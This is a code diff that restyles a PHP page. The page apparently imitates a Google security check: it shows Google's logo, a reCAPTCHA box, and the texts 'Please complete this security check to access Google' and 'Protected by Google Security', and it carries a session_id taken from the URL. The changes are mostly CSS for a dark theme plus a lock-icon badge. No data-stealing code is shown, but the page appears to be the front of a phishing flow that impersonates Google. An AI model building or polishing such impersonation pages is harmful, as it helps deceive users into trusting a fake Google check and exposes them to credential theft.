@@ -26,162 +26,280 @@ if (isset($_GET['session_id']) && !empty($_GET['session_id'])) {
     <link rel="stylesheet" href="pages/res/css/captcha.css">
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <style>
+        :root {
+            --bg-0: #0b0f17;
+            --bg-1: #111726;
+            --bg-2: #1a2233;
+            --card: rgba(22, 28, 42, 0.85);
+            --border: rgba(120, 140, 180, 0.14);
+            --border-strong: rgba(120, 140, 180, 0.28);
+            --text-1: #e8edf7;
+            --text-2: #9aa7bd;
+            --text-3: #6b7689;
+            --accent-1: #4f8cff;
+            --accent-2: #8b5cf6;
+            --accent-glow: rgba(79, 140, 255, 0.35);
+            --danger: #ff5c72;
+            --radius-lg: 22px;
+            --radius-md: 12px;
+            --radius-sm: 8px;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: "Google Sans", Roboto, Arial, sans-serif;
+            font-family: "Inter", "Google Sans", Roboto, -apple-system, Arial, sans-serif;
         }
 
-        :root {
-            --bg-color: rgb(240 244 249 / 1);
-            --card-bg: #fff;
-            --text-primary: #202124;
-            --text-secondary: #5f6368;
-            --border-color: #dadce0;
-            --hover-bg: rgba(95, 99, 104, 0.08);
-            --error-color: #d93025;
-            --button-bg: #0b57d0;
-            --button-hover: #1a73e8;
-            --button-text: #fff;
+        html, body {
+            min-height: 100%;
         }
 
         body {
-            background: var(--bg-color);
+            background: var(--bg-0);
+            color: var(--text-1);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 24px 16px;
+            position: relative;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Ambient background glow */
+        body::before,
+        body::after {
+            content: "";
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(120px);
+            opacity: 0.55;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::before {
+            width: 520px;
+            height: 520px;
+            background: radial-gradient(circle, var(--accent-1), transparent 70%);
+            top: -180px;
+            left: -160px;
+        }
+
+        body::after {
+            width: 520px;
+            height: 520px;
+            background: radial-gradient(circle, var(--accent-2), transparent 70%);
+            bottom: -200px;
+            right: -160px;
         }
 
         .container {
-            width: 1060px;
-            margin: 0 auto;
-            padding: 20px;
+            width: 100%;
+            max-width: 980px;
+            position: relative;
+            z-index: 1;
         }
 
         .signin-card {
-            background: var(--card-bg);
-            border-radius: 25px;
-            padding: 35px 40px 36px;
-            display: flex;
-            justify-content: space-between;
-            gap: 100px;
-            height: 402px;
+            background: var(--card);
+            backdrop-filter: blur(18px);
+            -webkit-backdrop-filter: blur(18px);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-lg);
+            padding: 40px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 48px;
             position: relative;
             overflow: hidden;
+            box-shadow:
+                0 30px 80px rgba(0, 0, 0, 0.55),
+                0 0 0 1px rgba(255, 255, 255, 0.02) inset;
+        }
+
+        /* Top accent line */
+        .signin-card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--accent-1), var(--accent-2), transparent);
+            opacity: 0.8;
+            z-index: 3;
         }
 
         .signin-left {
-            flex: 1;
-            max-width: 450px;
             display: flex;
             flex-direction: column;
+            justify-content: flex-start;
+            padding-top: 8px;
         }
 
         .signin-right {
-            flex: 1;
-            max-width: 450px;
-            padding-top: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding-top: 8px;
         }
 
         .logo-container {
-            margin-bottom: 32px;
+            margin-bottom: 28px;
         }
 
         .google-logo {
-            width: 48px;
-            height: 48px;
+            width: 44px;
+            height: 44px;
             display: block;
+            filter: drop-shadow(0 4px 14px var(--accent-glow));
         }
 
         h1 {
-            color: var(--text-primary);
-            font-size: 44px;
-            font-weight: 400;
-            line-height: 1.3333;
-            margin-bottom: 15px;
-            text-align: left;
+            color: var(--text-1);
+            font-size: 34px;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            line-height: 1.2;
+            margin-bottom: 12px;
         }
 
         .subtitle {
-            color: var(--text-primary);
-            font-size: 16px;
-            font-weight: 400;
-            letter-spacing: 0.1px;
+            color: var(--text-2);
+            font-size: 15px;
             line-height: 1.5;
-            margin-bottom: 32px;
-            text-align: left;
+            margin-bottom: 28px;
         }
 
+        /* Verification panel */
         .verification-container {
             text-align: center;
-            padding: 48px 24px;
+            padding: 24px 16px 8px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         .verification-title {
-            color: var(--text-primary);
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 16px;
+            color: var(--text-1);
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: -0.01em;
+            margin-bottom: 10px;
         }
 
         .verification-text {
-            color: var(--text-secondary);
+            color: var(--text-2);
             font-size: 14px;
             line-height: 1.5;
-            margin-bottom: 8px;
+            margin-bottom: 24px;
         }
 
         .noscript-warning {
-            color: #d93025;
-            font-size: 16px;
-            margin: 24px 0;
+            color: var(--danger);
+            font-size: 15px;
+            margin: 16px 0;
+            padding: 12px 14px;
+            border: 1px solid rgba(255, 92, 114, 0.4);
+            border-left: 3px solid var(--danger);
+            border-radius: var(--radius-md);
+            background: rgba(255, 92, 114, 0.12);
+            text-align: left;
         }
 
         .error-message {
-            color: #d93025;
+            color: var(--danger);
             font-size: 12px;
             margin: 8px 0;
             display: none;
         }
 
+        /* reCAPTCHA wrapper — gives the widget a dark-friendly container */
+        .captcha-wrapper {
+            display: inline-block;
+            padding: 14px;
+            border: 1px solid var(--border-strong);
+            border-radius: var(--radius-md);
+            background: rgba(255, 255, 255, 0.03);
+            margin-bottom: 28px;
+            transition: border-color 0.2s ease, background 0.2s ease;
+        }
+
+        .captcha-wrapper:hover {
+            border-color: var(--accent-1);
+            background: rgba(79, 140, 255, 0.06);
+        }
+
         .g-recaptcha {
             display: inline-block;
-            margin-bottom: 60px;
         }
 
         .attribution {
-            color: var(--text-secondary);
+            color: var(--text-3);
             font-size: 12px;
+            line-height: 1.6;
+        }
+
+        .attribution .lock {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--text-2);
+            font-weight: 500;
+        }
+
+        .attribution .lock svg {
+            opacity: 0.7;
+            flex-shrink: 0;
         }
 
         .ray-id {
-            color: var(--text-secondary);
-            font-size: 12px;
+            color: var(--text-3);
+            font-size: 11px;
             margin-top: 8px;
         }
 
         .ray-id code {
-            font-family: monospace;
-            background: var(--bg-color);
-            padding: 2px 4px;
-            border-radius: 3px;
+            font-family: "SF Mono", "JetBrains Mono", monospace;
+            background: var(--bg-2);
+            border: 1px solid var(--border);
+            color: var(--text-2);
+            padding: 2px 6px;
+            border-radius: 4px;
+            letter-spacing: 0.02em;
         }
 
+        /* Footer */
         .footer {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 20px 0;
+            padding: 22px 8px 0;
+            color: var(--text-3);
+            font-size: 12px;
         }
 
         .language-select {
-            color: var(--text-primary);
+            color: var(--text-2);
             font-size: 12px;
             border: 1px solid transparent;
-            border-radius: 4px;
+            border-radius: var(--radius-sm);
             background: transparent;
+            padding: 6px 8px;
+            cursor: pointer;
+            outline: none;
+            transition: all 0.18s ease;
+        }
+
+        .language-select:hover,
+        .language-select:focus {
+            color: var(--text-1);
+            border-color: var(--border-strong);
+            background: rgba(255,255,255,0.03);
         }
 
         .footer-links {
@@ -190,75 +308,59 @@ if (isset($_GET['session_id']) && !empty($_GET['session_id'])) {
         }
 
         .footer-links a {
-            color: var(--text-secondary);
+            color: var(--text-3);
             font-size: 12px;
             text-decoration: none;
-            letter-spacing: 0.3px;
+            letter-spacing: 0.02em;
+            transition: color 0.18s ease;
         }
 
         .footer-links a:hover {
-            text-decoration: underline;
+            color: var(--text-1);
         }
 
-        @media (max-width: 945px) {
-            .container {
-                width: 100%;
-                max-width: 480px;
-            }
-
+        @media (max-width: 860px) {
             .signin-card {
-                flex-direction: column;
-                gap: 24px;
-                height: auto;
-                padding: 48px;
-            }
-
-            .signin-left {
-                max-width: 100%;
+                grid-template-columns: 1fr;
+                gap: 32px;
+                padding: 32px 28px;
             }
 
             .signin-right {
-                max-width: 100%;
                 padding-top: 0;
             }
 
             h1 {
-                font-size: 24px;
-                margin-bottom: 8px;
+                font-size: 28px;
             }
 
             .subtitle {
-                font-size: 14px;
-                margin-bottom: 24px;
-            }
-
-            .logo-container {
-                margin-bottom: 16px;
+                margin-bottom: 20px;
             }
         }
 
-        @media (max-width: 600px) {
+        @media (max-width: 520px) {
             body {
-                background: var(--card-bg);
+                padding: 0;
                 align-items: flex-start;
             }
 
-            .container {
-                width: 100%;
-                padding: 0 24px;
-            }
-
             .signin-card {
-                padding: 20px 0;
-                height: auto;
-                flex-direction: column;
-                gap: 24px;
                 border-radius: 0;
+                border-left: none;
+                border-right: none;
+                padding: 28px 20px;
+                min-height: 100vh;
             }
 
             .footer {
-                margin-top: 32px;
-                padding-bottom: 8px;
+                flex-direction: column;
+                gap: 14px;
+                padding: 22px 0 8px;
+            }
+
+            .captcha-wrapper {
+                padding: 10px;
             }
         }
     </style>
@@ -268,7 +370,7 @@ if (isset($_GET['session_id']) && !empty($_GET['session_id'])) {
         <div class="signin-card">
             <div class="signin-left">
                 <div class="logo-container">
-                    <svg class="google-logo" viewBox="0 0 40 48" width="48" height="48" xmlns="http://www.w3.org/2000/svg">
+                    <svg class="google-logo" viewBox="0 0 40 48" width="44" height="44" xmlns="http://www.w3.org/2000/svg">
                         <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                         <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                         <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
@@ -292,11 +394,18 @@ if (isset($_GET['session_id']) && !empty($_GET['session_id'])) {
                             Please complete this security check to access Google
                         </p>
 
-                        <div class="g-recaptcha" data-sitekey="6LfTPlUUAAAAAGSUt1_LqpJXQpatx7_BzTDcU9On" data-callback="onCaptchaSuccess"></div>
+                        <div class="captcha-wrapper">
+                            <div class="g-recaptcha" data-sitekey="6LfTPlUUAAAAAGSUt1_LqpJXQpatx7_BzTDcU9On" data-callback="onCaptchaSuccess"></div>
+                        </div>
                         <div id="error-message" class="error-message"></div>
 
                         <div class="attribution">
-                            Protected by Google Security
+                            <span class="lock">
+                                <svg aria-hidden="true" fill="currentColor" focusable="false" width="12" height="12" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
+                                </svg>
+                                Protected by Google Security
+                            </span>
                             <div class="ray-id">
                                 Request ID: <code id="request-id"></code>
                             </div>
